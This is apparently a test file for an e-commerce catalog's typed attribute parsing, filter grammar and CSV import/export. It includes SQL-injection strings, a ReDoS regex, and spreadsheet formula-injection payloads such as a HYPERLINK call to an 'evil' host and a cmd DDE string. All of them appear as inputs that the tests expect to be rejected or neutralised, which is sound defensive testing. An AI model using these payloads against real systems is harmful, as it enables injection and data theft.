/**
 * Typed catalog attributes (Issue #291) — the pure domain: value grammar and
 * normalisation, definition validation, the filter grammar, and the CSV
 * reader/writer. No database, no network.
 *
 * The locale-independence block is the point of the numeric grammar: the same
 * input must produce the same stored value no matter the process locale, and
 * the ambiguous locale spellings (`1.234,5`, `1,5`) must be REFUSED, not read.
 */
import { describe, expect, test } from "bun:test";

import {
  validateCreateAttributeDefinition,
  validateUpdateAttributeDefinition
} from "../src/modules/commerce/domain/attribute-definition";
import {
  ATTRIBUTE_FILTER_NOT_AVAILABLE,
  parseAttributeFilterParams,
  resolveAttributeFilters,
  type FilterableDefinition
} from "../src/modules/commerce/domain/attribute-filter";
import {
  attributeCanonicalValue,
  attributeWireValue,
  canonicalFromScaled,
  compareDecimal,
  parseAttributeValue,
  type ValueDefinitionShape
} from "../src/modules/commerce/domain/attribute-value";
import {
  encodeCsvCell,
  neutralizeCsvCell,
  parseCsv,
  serializeCsv,
  unneutralizeCsvCell
} from "../src/modules/commerce/domain/catalog-csv";

const text = (constraints = {}): ValueDefinitionShape => ({
  valueType: "text",
  constraints
});
const integer = (constraints = {}): ValueDefinitionShape => ({
  valueType: "integer",
  constraints
});
const decimal = (constraints = {}): ValueDefinitionShape => ({
  valueType: "decimal",
  constraints
});

function numeric(definition: ValueDefinitionShape, raw: unknown): string {
  const result = parseAttributeValue(definition, raw);
  if (!result.valid) throw new Error(result.message);
  return result.value.canonical;
}

describe("typed value parsing", () => {
  test("decimal accepts only '.' as separator and never guesses at locale spellings", () => {
    expect(numeric(decimal(), "1234.5")).toBe("1234.5");
    expect(numeric(decimal(), "  +0012.50 ")).toBe("12.5");
    expect(numeric(decimal(), "-0.0")).toBe("0");

    for (const ambiguous of [
      "1.234,5",
      "1,5",
      "1 234.5",
      "1_000",
      ".5",
      "5.",
      "1e3",
      "0x10",
      "١٢٣", // Arabic-Indic digits
      "１２３", // full-width digits
      "NaN",
      "Infinity",
      ""
    ]) {
      expect(parseAttributeValue(decimal(), ambiguous).valid).toBe(false);
    }
  });

  test("decimal never rounds: more fractional digits than scale is refused", () => {
    expect(parseAttributeValue(decimal({ scale: 2 }), "1.239").valid).toBe(
      false
    );
    expect(numeric(decimal({ scale: 2 }), "1.230")).toBe("1.23");
  });

  test("a decimal must arrive as a string; a JSON float is refused", () => {
    expect(parseAttributeValue(decimal(), 0.1).valid).toBe(false);
  });

  test("integer: grammar, JSON number, and the 12-digit bound", () => {
    expect(numeric(integer(), "42")).toBe("42");
    expect(numeric(integer(), 42)).toBe("42");
    expect(numeric(integer(), "-007")).toBe("-7");
    expect(parseAttributeValue(integer(), "4.0").valid).toBe(false);
    expect(parseAttributeValue(integer(), "1,000").valid).toBe(false);
    expect(parseAttributeValue(integer(), 1.5).valid).toBe(false);
    expect(parseAttributeValue(integer(), 2 ** 53).valid).toBe(false);
    expect(numeric(integer(), "999999999999")).toBe("999999999999");
    expect(parseAttributeValue(integer(), "9007199254740991").valid).toBe(
      false
    );
  });

  test("min/max are enforced with exact decimal comparison", () => {
    const bounded = decimal({ min: "0.1", max: "0.3", scale: 2 });
    expect(parseAttributeValue(bounded, "0.10").valid).toBe(true);
    expect(parseAttributeValue(bounded, "0.30").valid).toBe(true);
    expect(parseAttributeValue(bounded, "0.09").valid).toBe(false);
    expect(parseAttributeValue(bounded, "0.31").valid).toBe(false);
    expect(compareDecimal("0.30000000", "0.3")).toBe(0);
    expect(compareDecimal("-1", "0")).toBe(-1);
  });

  test("result is independent of the process locale", () => {
    const original = process.env.LC_ALL;
    try {
      process.env.LC_ALL = "id_ID.UTF-8";
      expect(numeric(decimal(), "1234.5")).toBe("1234.5");
      expect(parseAttributeValue(decimal(), "1234,5").valid).toBe(false);
    } finally {
      if (original === undefined) delete process.env.LC_ALL;
      else process.env.LC_ALL = original;
    }
  });

  test("boolean: JSON booleans and the strings true/false only", () => {
    const boolean: ValueDefinitionShape = {
      valueType: "boolean",
      constraints: {}
    };
    expect(numeric(boolean, true)).toBe("true");
    expect(numeric(boolean, " FALSE ")).toBe("false");
    for (const bad of ["1", "0", "yes", "on", 1, 0, null, ""]) {
      expect(parseAttributeValue(boolean, bad).valid).toBe(false);
    }
  });

  test("date: strict ISO calendar dates", () => {
    const date: ValueDefinitionShape = { valueType: "date", constraints: {} };
    expect(numeric(date, "2024-02-29")).toBe("2024-02-29");
    for (const bad of [
      "2023-02-29",
      "2024-13-01",
      "2024-00-10",
      "2024-04-31",
      "2024-1-5",
      "24-01-01",
      "2024-01-01T00:00:00Z",
      "01/02/2024",
      20240101
    ]) {
      expect(parseAttributeValue(date, bad).valid).toBe(false);
    }
    const bounded: ValueDefinitionShape = {
      valueType: "date",
      constraints: { min: "2024-01-01", max: "2024-12-31" }
    };
    expect(parseAttributeValue(bounded, "2023-12-31").valid).toBe(false);
    expect(parseAttributeValue(bounded, "2025-01-01").valid).toBe(false);
    expect(parseAttributeValue(bounded, "2024-06-15").valid).toBe(true);
  });

  test("enum: exact, case-sensitive membership", () => {
    const size: ValueDefinitionShape = {
      valueType: "enum",
      constraints: {
        options: [
          { value: "s", label: "Small" },
          { value: "m", label: "Medium" }
        ]
      }
    };
    expect(numeric(size, "s")).toBe("s");
    expect(parseAttributeValue(size, "S").valid).toBe(false);
    expect(parseAttributeValue(size, "xl").valid).toBe(false);
    expect(parseAttributeValue(size, "s' OR '1'='1").valid).toBe(false);
  });

  test("text: NFC-normalised, trimmed, single line, bounded, deterministic search form", () => {
    const composed = numeric(text(), "  Café  "); // e + combining acute
    expect(composed).toBe("Café");
    const parsed = parseAttributeValue(text(), "Ｃａｆé"); // full-width
    expect(parsed.valid && parsed.value.search).toBe("café");
    expect(parseAttributeValue(text(), "line1\nline2").valid).toBe(false);
    expect(parseAttributeValue(text(), "tab\there").valid).toBe(false);
    expect(parseAttributeValue(text({ maxLength: 3 }), "abcd").valid).toBe(
      false
    );
    expect(parseAttributeValue(text({ minLength: 2 }), "a").valid).toBe(false);
    // An emoji is ONE character against the bound.
    expect(parseAttributeValue(text({ maxLength: 1 }), "😀").valid).toBe(true);
    expect(parseAttributeValue(text(), 5).valid).toBe(false);
    expect(parseAttributeValue(text(), "   ").valid).toBe(false);
  });

  test("scaled-integer storage: value x 10^6 round-trips exactly, with no float anywhere", () => {
    const stored = (raw: string) => {
      const result = parseAttributeValue(decimal({ scale: 6 }), raw);
      if (!result.valid) throw new Error(result.message);
      return result.value;
    };
    expect(stored("1.5").scaled).toBe("1500000");
    expect(stored("-0.000001").scaled).toBe("-1");
    expect(stored("0.1").scaled).toBe("100000");
    expect(stored("999999999999.999999").scaled).toBe("999999999999999999");
    expect(stored("-999999999999.999999").scaled).toBe("-999999999999999999");
    // The famous float trap: 0.1 + 0.2 is exactly 0.3 here.
    expect(BigInt(stored("0.1").scaled!) + BigInt(stored("0.2").scaled!)).toBe(
      BigInt(stored("0.3").scaled!)
    );

    expect(canonicalFromScaled("1500000")).toBe("1.5");
    expect(canonicalFromScaled("-1")).toBe("-0.000001");
    expect(canonicalFromScaled("0")).toBe("0");
    expect(canonicalFromScaled("-0")).toBe("0");
    expect(canonicalFromScaled("42000000")).toBe("42");
    expect(canonicalFromScaled("999999999999999999")).toBe(
      "999999999999.999999"
    );
    for (const raw of [
      "0",
      "1",
      "-1",
      "12.5",
      "-0.000123",
      "123456789012.000001"
    ]) {
      expect(canonicalFromScaled(stored(raw).scaled!)).toBe(raw);
    }

    const row = {
      valueText: null,
      valueScaled: "42000000",
      valueBoolean: null,
      valueDate: null
    };
    expect(attributeWireValue("integer", row)).toBe(42);
    expect(attributeWireValue("decimal", row)).toBe("42");
    expect(
      attributeCanonicalValue("boolean", {
        ...row,
        valueScaled: null,
        valueBoolean: true
      })
    ).toBe("true");
  });

  test("magnitude: 12 integer digits and at most 6 fractional digits fit the bigint", () => {
    expect(parseAttributeValue(integer(), "999999999999").valid).toBe(true);
    expect(parseAttributeValue(integer(), "1000000000000").valid).toBe(false);
    expect(parseAttributeValue(decimal({ scale: 6 }), "1.0000001").valid).toBe(
      false
    );
    expect(parseAttributeValue(decimal({ scale: 7 }), "1").valid).toBe(true); // scale only bounds input digits
  });
});

describe("attribute definition validation", () => {
  const base = { key: "weight_kg", label: "Weight", valueType: "decimal" };

  test("a minimal definition validates with safe defaults", () => {
    const result = validateCreateAttributeDefinition(base);
    expect(result.valid).toBe(true);
    if (result.valid) {
      expect(result.value.appliesTo).toBe("product");
      expect(result.value.isFilterable).toBe(false);
      expect(result.value.visiblePublic).toBe(false);
      expect(result.value.visibleAdmin).toBe(true);
    }
  });

  test("keys must be slugs: injection payloads, case, spacing and length are refused", () => {
    for (const key of [
      "Weight",
      "1weight",
      "weight kg",
      "weight-kg",
      'x"; DROP TABLE awcms_commerce_products; --',
      "a'b",
      "a.b",
      "",
      "k".repeat(64)
    ]) {
      expect(validateCreateAttributeDefinition({ ...base, key }).valid).toBe(
        false
      );
    }
  });

  test("constraints are a closed schema per type", () => {
    expect(
      validateCreateAttributeDefinition({
        ...base,
        valueType: "boolean",
        constraints: { min: "1" }
      }).valid
    ).toBe(false);
    expect(
      validateCreateAttributeDefinition({
        ...base,
        constraints: { pattern: "(a+)+$" }
      }).valid
    ).toBe(false);
    expect(
      validateCreateAttributeDefinition({
        ...base,
        constraints: { min: "1,5" }
      }).valid
    ).toBe(false);
    expect(
      validateCreateAttributeDefinition({
        ...base,
        constraints: { min: "5", max: "1" }
      }).valid
    ).toBe(false);
    const ok = validateCreateAttributeDefinition({
      ...base,
      constraints: { min: "0", max: "1000.5", scale: 3 }
    });
    expect(ok.valid).toBe(true);
  });

  test("enum needs options; duplicates and non-slug values are refused", () => {
    const enumBase = { key: "size", label: "Size", valueType: "enum" };
    expect(validateCreateAttributeDefinition(enumBase).valid).toBe(false);
    expect(
      validateCreateAttributeDefinition({
        ...enumBase,
        constraints: { options: [{ value: "s" }, { value: "s" }] }
      }).valid
    ).toBe(false);
    expect(
      validateCreateAttributeDefinition({
        ...enumBase,
        constraints: { options: [{ value: "x y" }] }
      }).valid
    ).toBe(false);
    const ok = validateCreateAttributeDefinition({
      ...enumBase,
      constraints: {
        options: [{ value: "s", label: "Small" }, { value: "m" }]
      },
      isSearchable: true
    });
    expect(ok.valid).toBe(true);
    if (ok.valid) expect(ok.value.constraints.options?.[1]?.label).toBe("m");
  });

  test("searchable is limited to text-bearing types", () => {
    expect(
      validateCreateAttributeDefinition({ ...base, isSearchable: true }).valid
    ).toBe(false);
  });

  test("labels are per-locale and bounded", () => {
    expect(
      validateCreateAttributeDefinition({
        ...base,
        labels: { en: "Weight", id: "Berat" }
      }).valid
    ).toBe(true);
    expect(
      validateCreateAttributeDefinition({ ...base, labels: { "EN-us!": "x" } })
        .valid
    ).toBe(false);
  });

  test("key and valueType are immutable on update", () => {
    expect(
      validateUpdateAttributeDefinition({ key: "other" }, "text").valid
    ).toBe(false);
    expect(
      validateUpdateAttributeDefinition({ valueType: "integer" }, "text").valid
    ).toBe(false);
    expect(
      validateUpdateAttributeDefinition(
        { constraints: { maxLength: 50 } },
        "text"
      ).valid
    ).toBe(true);
    expect(
      validateUpdateAttributeDefinition(
        { constraints: { maxLength: 50 } },
        "integer"
      ).valid
    ).toBe(false);
  });
});

describe("attribute filter grammar", () => {
  const definitions: FilterableDefinition[] = [
    {
      id: "00000000-0000-0000-0000-000000000001",
      key: "weight",
      valueType: "decimal",
      constraints: { scale: 2 },
      isFilterable: true,
      visiblePublic: true,
      appliesTo: "product"
    },
    {
      id: "00000000-0000-0000-0000-000000000002",
      key: "secret_grade",
      valueType: "text",
      constraints: {},
      isFilterable: true,
      visiblePublic: false,
      appliesTo: "product"
    },
    {
      id: "00000000-0000-0000-0000-000000000003",
      key: "not_filterable",
      valueType: "text",
      constraints: {},
      isFilterable: false,
      visiblePublic: true,
      appliesTo: "product"
    },
    {
      id: "00000000-0000-0000-0000-000000000004",
      key: "size",
      valueType: "enum",
      constraints: {
        options: [
          { value: "s", label: "s" },
          { value: "m", label: "m" }
        ]
      },
      isFilterable: true,
      visiblePublic: true,
      appliesTo: "both"
    }
  ];

  function resolve(params: string[], audience: "admin" | "public") {
    const parsed = parseAttributeFilterParams(params);
    if (!parsed.valid) return parsed;
    return resolveAttributeFilters(parsed.value, definitions, audience);
  }

  test("parses key:operator:value, splitting on the first two colons only", () => {
    const parsed = parseAttributeFilterParams([
      "weight:gte:1.5",
      "size:in:s,m"
    ]);
    expect(parsed.valid).toBe(true);
    const colon = parseAttributeFilterParams(["weight:eq:a:b:c"]);
    expect(colon.valid && colon.value[0]?.value).toBe("a:b:c");
  });

  test("operators are a closed set", () => {
    for (const operator of ["like", "regex", "=", "gt", "EQ", "eq;", "'", ""]) {
      expect(parseAttributeFilterParams([`weight:${operator}:1`]).valid).toBe(
        false
      );
    }
  });

  test("injection payloads in keys, operators and values never reach SQL shape", () => {
    const payloads = [
      `weight";DROP TABLE x;--:eq:1`,
      `weight:eq;DROP TABLE x:1`,
      `weight) OR 1=1 --:eq:1`,
      `wei'ght:eq:1`,
      `weight:eq:1' OR '1'='1`,
      `weight:in:1,2) OR (1=1`,
      `weight:gte:1; SELECT pg_sleep(10)`,
      `${"a".repeat(500)}:eq:1`,
      `no-colons`,
      `key:eq`
    ];
    for (const payload of payloads) {
      const result = resolve([payload], "admin");
      // Every payload is rejected before it could become anything but a
      // bound, typed operand — a value-position payload fails the typed
      // grammar (decimal), a key/operator-position payload fails the shape.
      expect(result.valid).toBe(false);
    }
    // And a payload in a TEXT value is accepted only as an inert bound string.
    const text = resolve(["secret_grade:eq:1' OR '1'='1"], "admin");
    expect(text.valid).toBe(true);
    if (text.valid) {
      expect(text.value[0]?.definitionId).toBe(definitions[1]?.id);
      expect(text.value[0]?.operands[0]?.text).toBe("1' OR '1'='1");
    }
  });

  test("unknown, non-filterable and (public) non-public keys read identically", () => {
    const messages = [
      resolve(["nope:eq:1"], "admin"),
      resolve(["not_filterable:eq:x"], "admin"),
      resolve(["secret_grade:eq:x"], "public")
    ].map((r) => (r.valid ? "ok" : r.message));
    expect(new Set(messages)).toEqual(
      new Set([ATTRIBUTE_FILTER_NOT_AVAILABLE])
    );
    expect(resolve(["secret_grade:eq:x"], "admin").valid).toBe(true);
  });

  test("operand values are parsed with the typed grammar and operator/type pairs are checked", () => {
    expect(resolve(["weight:gte:1,5"], "admin").valid).toBe(false);
    expect(resolve(["weight:gte:1.5"], "admin").valid).toBe(true);
    expect(resolve(["size:gte:s"], "admin").valid).toBe(false);
    expect(resolve(["size:eq:xl"], "admin").valid).toBe(false);
    expect(resolve(["size:in:s,m"], "admin").valid).toBe(true);
    expect(resolve(["weight:contains:1"], "admin").valid).toBe(false);
    expect(resolve(["secret_grade:contains:ab"], "admin").valid).toBe(true);
  });

  test("bounds: filter count, in-list size, duplicate (key, operator)", () => {
    expect(
      parseAttributeFilterParams(
        Array.from({ length: 6 }, (_, i) => `k${i}:eq:1`)
      ).valid
    ).toBe(false);
    expect(
      parseAttributeFilterParams(["weight:eq:1", "weight:eq:2"]).valid
    ).toBe(false);
    const many = Array.from({ length: 21 }, () => "s").join(",");
    expect(resolve([`size:in:${many}`], "admin").valid).toBe(false);
  });
});

describe("CSV writing: formula-injection neutralisation and RFC 4180 quoting", () => {
  test("cells starting with = + - @ TAB CR are prefixed with a single quote", () => {
    for (const cell of [
      "=1+1",
      '=HYPERLINK("http://evil/?"&A1)',
      "+cmd|' /C calc'!A0",
      "-2+3",
      "@SUM(A1)",
      "\tfoo",
      "\rfoo"
    ]) {
      expect(neutralizeCsvCell(cell)).toBe(`'${cell}`);
    }
    expect(neutralizeCsvCell("plain")).toBe("plain");
    expect(neutralizeCsvCell("")).toBe("");
  });

  test("a cell that is entirely a plain signed number is left alone", () => {
    expect(neutralizeCsvCell("-5")).toBe("-5");
    expect(neutralizeCsvCell("+3.25")).toBe("+3.25");
    expect(neutralizeCsvCell("-5+3")).toBe("'-5+3");
    expect(neutralizeCsvCell("-5 ")).toBe("'-5 ");
  });

  test("neutralisation is reversed on import", () => {
    for (const cell of ["=1+1", "@x", "+x", "-x", "\tx"]) {
      expect(unneutralizeCsvCell(neutralizeCsvCell(cell))).toBe(cell);
    }
    expect(unneutralizeCsvCell("'plain")).toBe("'plain");
  });

  test("quoting: commas, quotes and line breaks", () => {
    expect(encodeCsvCell("a,b")).toBe('"a,b"');
    expect(encodeCsvCell('say "hi"')).toBe('"say ""hi"""');
    expect(encodeCsvCell("two\nlines")).toBe('"two\nlines"');
    expect(encodeCsvCell("=A1,2")).toBe(`"'=A1,2"`);
    expect(encodeCsvCell(null)).toBe("");
  });

  test("serialize -> parse round trips every awkward cell, with a UTF-8 BOM", () => {
    const rows = [
      ["sku", "name"],
      ["A-1", 'He said "hi", twice'],
      ["A-2", "multi\nline"],
      ["A-3", "Café ☕ 日本語"],
      ["A-4", ""]
    ];
    const csv = serializeCsv(rows);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    const parsed = parseCsv(csv);
    expect(parsed.ok).toBe(true);
    if (parsed.ok) {
      expect(parsed.header.cells).toEqual(["sku", "name"]);
      expect(parsed.rows.map((row) => row.cells)).toEqual(rows.slice(1));
    }
  });
});

describe("CSV reading", () => {
  test("handles CRLF, LF, CR, a missing final newline and blank lines", () => {
    const parsed = parseCsv("a,b\r\n1,2\n\n3,4\r5,6");
    expect(parsed.ok).toBe(true);
    if (parsed.ok) {
      expect(parsed.rows.map((r) => r.cells)).toEqual([
        ["1", "2"],
        ["3", "4"],
        ["5", "6"]
      ]);
      expect(parsed.rows[0]?.line).toBe(2);
    }
  });

  test("malformed input is an error, never silently repaired", () => {
    for (const bad of [
      'a,b\n1,"unterminated',
      'a,b\n1,x"y',
      'a,b\n1,"x"y',
      "a,b\n1,\u00002",
      ""
    ]) {
      expect(parseCsv(bad).ok).toBe(false);
    }
  });

  test("limits: rows, columns and cell length", () => {
    const limits = { maxRows: 2, maxColumns: 3, maxCellLength: 5 };
    expect(parseCsv("a\n1\n2\n3", limits).ok).toBe(false);
    expect(parseCsv("a\n1\n2", limits).ok).toBe(true);
    expect(parseCsv("a,b,c,d\n1,2,3,4", limits).ok).toBe(false);
    expect(parseCsv("a\n123456", limits).ok).toBe(false);
  });
});
